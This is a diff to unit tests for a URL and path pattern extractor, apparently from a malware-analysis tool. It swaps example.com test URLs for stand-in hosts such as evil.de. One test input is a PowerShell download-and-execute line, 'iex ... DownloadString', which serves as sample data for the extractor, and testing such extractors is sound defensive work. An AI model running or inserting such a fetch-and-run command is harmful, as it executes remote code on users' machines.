@@ -180,8 +180,8 @@ class TestPatternExtractor(TestUnitBase):
         )
 
     def test_url_filters(self):
-        self.assertEqual('http://www.example.com/',
-            str(B'tthttp://www.example.com/' | self.load('url', filter=1)))
+        self.assertEqual('http://www.evil.ru/',
+            str(B'tthttp://www.evil.ru/' | self.load('url', filter=1)))
 
     def test_path_extraction(self):
         data = inspect.cleandoc(
@@ -195,9 +195,9 @@ class TestPatternExtractor(TestUnitBase):
         self.assertEqual(data | self.load('path', filter=2) | bytes, data)
 
     def test_strip_quote_from_url_regression(self):
-        data = "iex (New-Object System.Net.WebClient).DownloadString('http://www.example.com/boom');".encode('utf-16le')
+        data = "iex (New-Object System.Net.WebClient).DownloadString('http://www.evil.de/boom');".encode('utf-16le')
         url = str(data | self.load('url'))
-        self.assertEqual(url, 'http://www.example.com/boom')
+        self.assertEqual(url, 'http://www.evil.de/boom')
 
     def test_webDAV_paths(self):
         data = B"\\\\1.1.1.1@556\\the\\finest\\binaires"
